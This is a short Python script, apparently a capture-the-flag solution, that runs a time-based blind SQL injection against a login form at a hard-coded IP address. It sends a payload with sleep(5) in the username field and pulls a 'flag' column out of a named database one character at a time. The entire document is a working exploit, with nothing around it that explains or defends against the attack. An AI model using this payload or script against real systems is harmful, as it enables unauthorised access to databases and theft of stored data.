import requests
import string
import time
import sys

#table_name = its_in_here

def bruteforcer():
    chars = string.printable[:-6]
    print(chars)
    session = requests.session()
    url = "http://128.238.62.229:2002/auth/login"
    database_name = ""
    while True:
        for i in range(1,25):
            for char in chars:
                name = f"{database_name}{char}"
                sys.stdout.write(f"\r[+]Table name: {name}")
                payload = f"admin' AND if((select substr(flag,{i},1) from the_db_you_are_looking_for.its_in_here limit 0,1) = '{char}', sleep(5), null);-- -"
                data = {"username" : payload,
                        "password" : "test"}
                time_started = time.time()
                output = session.post(url,data=data,allow_redirects = False)
                time_finished = time.time()
                time_taken = time_finished - time_started
                if time_taken < 5:
                    pass
                elif char == '%':
                    pass
                else:
                    database_name += char
                    break

if __name__ == ("__main__"):
    bruteforcer()

